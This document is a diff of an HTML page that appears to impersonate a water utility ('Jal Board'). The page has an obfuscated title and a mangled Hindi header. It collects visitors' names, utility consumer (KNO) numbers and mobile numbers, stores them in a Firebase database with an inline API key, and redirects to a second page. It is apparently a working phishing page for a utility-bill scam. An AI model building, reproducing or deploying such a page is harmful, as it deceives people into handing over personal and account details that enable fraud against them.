@@ -1,84 +1,76 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>dehijlbrd</title>
   <style>
     body {
-      font-family: Arial, sans-serif;
+      font-family: Arial;
       background-color: #FFFFFF;
       text-align: center;
-      padding: 20px;
-      margin: 0;
+      padding-top: 50px;
     }
     img {
-      width: 100%;
-      max-width: 300px;
+      width: 300px;
       border-radius: 10px;
     }
     .side-button {
-      margin-top: 20px;
-      padding: 12px 20px;
-      font-size: 16px;
+      margin-top: 2px;
+      padding: 10px 108px;
+      font-size: 17px;
       background-color: #FF0000;
       color: #FFFFFF;
       border: none;
       border-radius: 10px;
-      width: 100%;
-      cursor: pointer;
     }
     .form-container {
-      margin-top: 30px;
+      margin-top: 50px;
       text-align: left;
-      max-width: 100%;
-      width: 100%;
+      max-width: 400px;
+      margin-left: auto;
+      margin-right: auto;
       background: white;
       padding: 20px;
       border-radius: 10px;
       box-shadow: 0 0 10px rgba(0,0,0,0.1);
-      box-sizing: border-box;
     }
     input[type="text"], input[type="email"] {
       width: 100%;
-      padding: 12px;
+      padding: 10px;
       margin: 10px 0;
       border-radius: 5px;
       border: 1px solid #ccc;
-      box-sizing: border-box;
     }
     label {
       font-size: 16px;
       font-weight: bold;
-      display: block;
-      margin-top: 10px;
     }
     .form-container h2 {
       text-align: center;
       background-color: #00008b;
       color: white;
-      padding: 12px;
+      padding: 10px;
       border-radius: 5px;
-      font-size: 20px;
     }
   </style>
 </head>
 <body>
-  <img src="https://i.ibb.co/s9ptXmZv/images-5.jpg" alt="Meri Tasveer" />
+  <img src="https://i.ibb.co/s9ptXmZv/images-5.jpg" alt="Meri Tasveer">
 
   <div class="form-container">
-    <h2>जल¥बोर्ड</h2>
-    <form id="myForm">
+    <h2>जल¥बोर्ड </h2>
+    <form onsubmit="submitForm(event)">
       <label for="name">Name*</label>
-      <input type="text" id="name" placeholder="Full Name" required />
+      <input type="text" id="name" placeholder="Full Name" required>
 
       <label for="kno">Kno Number*</label>
-      <input type="text" id="kno" placeholder="KNO Number" required />
+      <input type="text" id="kno" placeholder="KNO Number" required>
 
       <label for="mobile">Mobile*</label>
-      <input type="text" id="mobile" placeholder="Mobile Number" required />
+      <input type="text" id="mobile" placeholder="Mobile Number" required>
 
-      <button class="side-button" type="submit">Continue</button>
+      <div style="text-align: center;">
+        <button class="side-button" type="submit">Continue</button>
+      </div>
     </form>
   </div>
 
@@ -86,36 +78,38 @@
   <script src="https://www.gstatic.com/firebasejs/9.6.11/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.6.11/firebase-firestore-compat.js"></script>
 
-  <!-- Firebase Config -->
-  <script src="firebase-config.js"></script>
-
-  <!-- Submit Logic -->
   <script>
-    document.getElementById("myForm").addEventListener("submit", function(e) {
+    // Your Firebase config
+    const firebaseConfig = {
+      apiKey: "AIzaSyDdRv4_wFI5hjSi_0ci_YDUsdWY5Uv7wDE",
+      authDomain: "dlhiljbrd.firebaseapp.com",
+      projectId: "dlhiljbrd",
+      storageBucket: "dlhiljbrd.firebasestorage.app",
+      messagingSenderId: "981951131769",
+      appId: "1:981951131769:web:5d56cd1423d753992664a8"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+
+    function submitForm(e) {
       e.preventDefault();
 
-      const name = document.getElementById("name").value.trim();
-      const kno = document.getElementById("kno").value.trim();
-      const mobile = document.getElementById("mobile").value.trim();
-
-      if (!name || !kno || !mobile) {
-        alert("Please fill all fields.");
-        return;
-      }
+      const name = document.getElementById("name").value;
+      const kno = document.getElementById("kno").value;
+      const mobile = document.getElementById("mobile").value;
 
       db.collection("users").add({
         name: name,
         kno: kno,
         mobile: mobile,
         timestamp: firebase.firestore.FieldValue.serverTimestamp()
-      })
-      .then(() => {
-        window.location.href = "page2.html";
-      })
-      .catch((error) => {
-        alert("Error saving data: " + error.message);
+      }).then(() => {
+        window.location.href = "page2.html"; // Replace with your actual next page
+      }).catch((error) => {
+        alert("Error saving data: " + error);
       });
-    });
+    }
   </script>
 </body>
 </html>
